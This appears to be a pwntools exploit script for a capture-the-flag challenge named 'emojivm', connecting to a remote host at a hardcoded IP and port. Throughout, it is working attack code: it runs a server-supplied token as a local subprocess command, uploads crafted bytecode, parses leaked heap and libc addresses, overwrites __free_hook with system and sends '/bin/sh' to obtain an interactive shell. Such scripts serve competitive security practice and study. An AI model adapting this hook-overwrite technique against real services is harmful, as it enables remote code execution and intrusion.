#!/usr/bin/env python2
from pwn import *
from IPython import embed
import subprocess

context.arch = 'amd64'

#r = remote('127.0.0.1', 7122)
r = remote('3.115.176.164', 30262)
#r = process(['./emojivm', './generated_code'])

r.recvuntil('token:\n')
x = r.recvline()[:-1]
print repr(x)
xx = subprocess.check_output(x.split(' '))
print repr(xx)
r.send(xx)


emoji = open('./generated_code', 'rb').read()
r.sendlineafter('size:', str(len(emoji)))
r.sendafter('file:\n', emoji)

#r.interactive()

x = r.recv(6)
heap = u64(x.ljust(8, '\x00'))
print 'heap', hex(heap)
x = r.recv(6)
libc = u64(x.ljust(8, '\x00'))
print 'libc', hex(libc)

free_hook = libc+0x1c48
system = libc+0x2047a0-0x5a1000
r.sendline(flat(free_hook))
sleep(0.2)
print 'system:', hex(system)
r.sendline(flat(system))
sleep(0.2)
#raw_input("@")
r.sendline('/bin/sh\x00')


r.interactive()
